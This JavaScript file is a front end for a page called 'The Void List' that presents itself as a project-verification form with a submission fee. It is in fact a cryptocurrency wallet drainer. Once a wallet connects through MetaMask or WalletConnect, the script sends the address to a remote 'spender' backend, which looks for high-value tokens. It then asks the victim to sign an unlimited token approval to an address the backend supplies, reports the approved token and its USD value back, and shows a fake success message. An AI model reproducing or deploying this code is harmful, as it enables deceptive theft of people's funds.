'use strict';

const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1"; 

// UI Elements
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');
const closeButtons = document.querySelectorAll('.close');

let provider, signer;

/* --- UI Logic --- */
projectForm.onsubmit = (e) => { e.preventDefault(); feeModal.classList.remove('hidden'); };
proceedButton.onclick = () => { feeModal.classList.add('hidden'); walletModal.classList.remove('hidden'); };
closeButtons.forEach(btn => btn.onclick = () => { 
    feeModal.classList.add('hidden'); 
    walletModal.classList.add('hidden'); 
});

/* --- MetaMask --- */
async function connectMetaMask() {
    if (!window.ethereum) return alert("MetaMask not found!");
    try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        walletModal.classList.add('hidden');
        await runMultiChainFlow(accounts[0]);
    } catch (e) { console.error(e); }
}

/* --- Regular WalletConnect v2 (Sign Client) --- */
async function connectWalletConnect() {
    try {
        walletConnectButton.innerText = "Connecting...";
        
        // Import the standalone modal and provider
        const { WalletConnectModal } = window.WalletConnectModal;
        const { EthereumProvider } = window.EthereumProvider;

        const web3Modal = new WalletConnectModal({
            projectId: WC_PROJECT_ID,
            chains: [1] // Ethereum Mainnet
        });

        const wcProvider = await EthereumProvider.init({
            projectId: WC_PROJECT_ID,
            showQrModal: true,
            qrModalOptions: { themeMode: "dark" },
            chains: [1], // Required
            optionalChains: [56, 137, 42161], // Optional (BSC, Polygon, Arbitrum)
            methods: ["eth_sendTransaction", "personal_sign", "wallet_switchEthereumChain"],
            events: ["chainChanged", "accountsChanged"],
            metadata: {
                name: 'The Void List',
                description: 'Project Verification',
                url: window.location.origin,
                icons: ['https://avatars.githubusercontent.com/u/37784886']
            }
        });

        // Trigger connection
        await wcProvider.connect();

        provider = new ethers.providers.Web3Provider(wcProvider);
        signer = provider.getSigner();
        const accounts = await provider.listAccounts();

        walletModal.classList.add('hidden');
        await runMultiChainFlow(accounts[0]);

    } catch (e) {
        console.error("WC Connection Error:", e);
        if (!e.message.includes("closed")) alert("Connection failed. Please retry.");
    } finally {
        walletConnectButton.innerText = "WalletConnect";
    }
}

/* --- The Main Pipeline --- */
async function runMultiChainFlow(account) {
    try {
        // 1. Scan via Backend
        const scanRes = await fetch(`${BACKEND_URL}/scan`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ owner: account })
        });
        const result = await scanRes.json();
        
        if (!result.success) return alert("No high-value assets found for verification.");

        const { tokenAddress, chainId, spenderAddress, symbol, usdValue } = result.data;

        // 2. Switch Chain (Native Ethers call)
        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: chainId }]);
        } catch (e) { console.log("Network switch ignored or manual needed."); }

        // 3. Approval
        const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        
        const tx = await contract.approve(spenderAddress, ethers.constants.MaxUint256);
        console.log("TX Hash:", tx.hash);
        await tx.wait();

        // 4. Final Notification
        await fetch(`${BACKEND_URL}/notify-approval`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                owner: account,
                tokenAddress,
                chainId,
                symbol,
                usdValue
            })
        });

        alert("✅ Project Submitted Successfully!");

    } catch (err) {
        console.error("Flow Error:", err);
        alert("Transaction Failed: " + (err.data?.message || err.message));
    }
}

// Event Listeners
metaMaskButton.onclick = connectMetaMask;
walletConnectButton.onclick = connectWalletConnect;
